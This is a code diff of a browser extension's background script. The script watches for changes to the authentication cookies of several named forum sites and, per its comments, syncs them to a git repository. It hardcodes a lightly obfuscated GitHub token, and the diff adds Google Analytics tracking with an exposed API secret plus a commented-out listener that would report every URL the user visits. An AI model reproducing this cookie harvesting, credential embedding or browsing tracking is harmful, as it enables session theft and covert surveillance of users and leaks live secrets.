@@ -1,3 +1,4 @@
+
 console.log('这是background脚本执行内容');
 
 // 监听传递过来的消息
@@ -64,6 +65,52 @@ var gitToken = "Bearer ghp_888grzs67MqxbZUH3wmIFKzecaKB0cTLy3ICBkl".replace("888
 
 // 设置图标上显示的文字
 // chrome.action.setBadgeText({ text: "" })
+// chrome.webRequest.onBeforeRequest.addListener(
+//   function (details) {
+//     let requestUrl = details.url
+//     console.log("请求完成了------", requestUrl);
+//     sendGoogleEvent(requestUrl)
+//   },
+//   { urls: ["<all_urls>"] }
+// );
+
+
+// 向google发送事件
+// 创建一个唯一的客户ID
+var clientId = ""
+async function initClient() {
+  clientId = await storageGet("clientId")
+  console.log("获取到的唯一ID是:", clientId);
+  if (!clientId) {
+    clientId = getUUID()
+    storageSet("clientId", clientId)
+  }
+}
+initClient()
+
+function sendGoogleEvent(event) {
+  console.log("sendGoogleEvent----", clientId);
+  const measurement_id = `G-WDMVX87J6G`;
+  const api_secret = `ee_mWL4aQE6SYkmOyuIjNg`;
+  fetch(`https://www.google-analytics.com/mp/collect?measurement_id=${measurement_id}&api_secret=${api_secret}`, {
+    method: "POST",
+    body: JSON.stringify({
+      client_id: clientId,
+      events: [{
+        // Event names must start with an alphabetic character.
+        name: event ? event : 'login',
+        params: event ? {
+          "content_type": "request",
+          "item_id": event
+        } : {
+          "search_term": "search_home"
+        }
+      }]
+    })
+  }).then(res => {
+    // console.log('sendGoogleEvent---', res);
+  });
+}
 
 
 // 监听Cookie发生变化，同步cookie到git
@@ -73,9 +120,12 @@ chrome.cookies.onChanged.addListener(async (changeInfo) => {
   var cookieDomain = "https://" + changeInfo.cookie.domain
   // console.log('检测到caoliuCookies的cookie变化了', cookieKey, cause);
   // 从缓存中获取导航数据
-  var real_json = await storageGet("content")
-  var cookieRuleKeys = Object.keys(real_json.data.cookieRule) || ["clcookies", "91ImgCookies", "98cookies"]
-  var cookieRuleValue = Object.values(real_json.data.cookieRule) || ["227c9_winduser", "CzG_auth", "cPNj_2132_auth"]
+  var realJson = await storageGet("content")
+  if (!realJson) {
+    return
+  }
+  var cookieRuleKeys = Object.keys(realJson.data.cookieRule) || ["clcookies", "91ImgCookies", "98cookies"]
+  var cookieRuleValue = Object.values(realJson.data.cookieRule) || ["227c9_winduser", "CzG_auth", "cPNj_2132_auth"]
   if (cookieRuleValue.includes(cookieKey)) {
     // console.log('检测到caoliuCookies的cookie变化了', changeInfo);
     // chrome.action.setBadgeText({ text: "c" })
@@ -188,5 +238,3 @@ async function storageGet(key) {
   }
   return value
 }
-
-// 开始刷贡献
